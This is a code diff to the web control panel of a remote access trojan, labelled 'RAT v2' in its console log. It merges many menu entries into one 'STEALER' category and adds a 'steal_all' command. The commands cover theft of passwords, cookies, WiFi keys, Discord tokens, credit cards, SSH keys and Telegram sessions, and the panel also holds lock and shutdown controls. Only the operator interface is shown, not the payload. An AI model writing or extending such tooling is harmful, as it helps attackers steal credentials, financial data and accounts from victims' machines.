@@ -421,116 +421,27 @@ let resultsData = [];
 let historyData = [];
 
 const CATEGORIES = {
-    'passwords': {
-        icon: '🔑',
-        title: 'PASSWORDS',
+    'stealer': {
+        icon: '🕵️',
+        title: 'STEALER',
         subs: [
-            { id: 'steal_passwords', label: '🔑 All Passwords', type: 'download' }
-        ]
-    },
-    'cookies': {
-        icon: '🍪',
-        title: 'COOKIES',
-        subs: [
-            { id: 'steal_cookies', label: '🍪 All Cookies', type: 'download' }
-        ]
-    },
-    'wifi': {
-        icon: '📶',
-        title: 'WIFI',
-        subs: [
-            { id: 'steal_wifi', label: '📶 WiFi Networks', type: 'download' }
-        ]
-    },
-    'history': {
-        icon: '🌐',
-        title: 'HISTORY',
-        subs: [
-            { id: 'steal_history', label: '🌐 Browser History', type: 'download' }
-        ]
-    },
-    'discord': {
-        icon: '🎮',
-        title: 'DISCORD',
-        subs: [
-            { id: 'steal_discord', label: '🎮 Discord Tokens', type: 'download' }
-        ]
-    },
-    'autofill': {
-        icon: '✏️',
-        title: 'AUTOFILL',
-        subs: [
-            { id: 'steal_autofill', label: '✏️ Autofill Data', type: 'download' }
-        ]
-    },
-    'cards': {
-        icon: '💳',
-        title: 'CREDIT CARDS',
-        subs: [
-            { id: 'steal_cards', label: '💳 Credit Cards', type: 'download' }
-        ]
-    },
-    'bookmarks': {
-        icon: '⭐',
-        title: 'BOOKMARKS',
-        subs: [
-            { id: 'steal_bookmarks', label: '⭐ Bookmarks', type: 'download' }
-        ]
-    },
-    'downloads': {
-        icon: '⬇️',
-        title: 'DOWNLOADS',
-        subs: [
-            { id: 'steal_downloads', label: '⬇️ Downloads History', type: 'download' }
-        ]
-    },
-    'network': {
-        icon: '🌐',
-        title: 'NETWORK',
-        subs: [
-            { id: 'steal_network', label: '🌐 Network Info', type: 'download' }
-        ]
-    },
-    'system': {
-        icon: '🖥️',
-        title: 'SYSTEM',
-        subs: [
-            { id: 'steal_system', label: '🖥️ System Info', type: 'download' }
-        ]
-    },
-    'software': {
-        icon: '📦',
-        title: 'SOFTWARE',
-        subs: [
-            { id: 'steal_software', label: '📦 Installed Software', type: 'download' }
-        ]
-    },
-    'processes': {
-        icon: '⚙️',
-        title: 'PROCESSES',
-        subs: [
-            { id: 'steal_processes', label: '⚙️ Running Processes', type: 'download' }
-        ]
-    },
-    'ssh': {
-        icon: '🔑',
-        title: 'SSH KEYS',
-        subs: [
-            { id: 'steal_ssh', label: '🔑 SSH Keys', type: 'download' }
-        ]
-    },
-    'startup': {
-        icon: '🚀',
-        title: 'STARTUP',
-        subs: [
-            { id: 'steal_startup', label: '🚀 Startup Programs', type: 'download' }
-        ]
-    },
-    'telegram': {
-        icon: '📱',
-        title: 'TELEGRAM',
-        subs: [
-            { id: 'steal_telegram', label: '📱 Telegram Sessions', type: 'download' }
+            { id: 'steal_passwords', label: '🔑 Passwords', type: 'download' },
+            { id: 'steal_cookies', label: '🍪 Cookies', type: 'download' },
+            { id: 'steal_wifi', label: '📶 WiFi', type: 'download' },
+            { id: 'steal_history', label: '🌐 History', type: 'download' },
+            { id: 'steal_discord', label: '🎮 Discord Tokens', type: 'download' },
+            { id: 'steal_autofill', label: '✏️ Autofill', type: 'download' },
+            { id: 'steal_cards', label: '💳 Credit Cards', type: 'download' },
+            { id: 'steal_bookmarks', label: '⭐ Bookmarks', type: 'download' },
+            { id: 'steal_downloads', label: '⬇️ Downloads', type: 'download' },
+            { id: 'steal_network', label: '🌐 Network Info', type: 'download' },
+            { id: 'steal_system', label: '🖥️ System Info', type: 'download' },
+            { id: 'steal_software', label: '📦 Software', type: 'download' },
+            { id: 'steal_processes', label: '⚙️ Processes', type: 'download' },
+            { id: 'steal_ssh', label: '🔑 SSH Keys', type: 'download' },
+            { id: 'steal_startup', label: '🚀 Startup', type: 'download' },
+            { id: 'steal_telegram', label: '📱 Telegram', type: 'download' },
+            { id: 'steal_all', label: '🔥 ALL DATA', type: 'download' }
         ]
     },
     'control': {
@@ -821,6 +732,7 @@ async function executeCommand(cmdId) {
         'steal_ssh': 'steal_ssh',
         'steal_startup': 'steal_startup',
         'steal_telegram': 'steal_telegram',
+        'steal_all': 'steal_all',
         'jump': 'jump',
         'lock': 'lock',
         'shutdown': 'shutdown',
@@ -980,7 +892,7 @@ setTimeout(() => {
     if (first) toggleCategory(first);
 }, 500);
 
-console.log('RAT v2 - All buttons separated');
+console.log('RAT v2 - All Stealer buttons');
 </script>
 </body>
 </html>
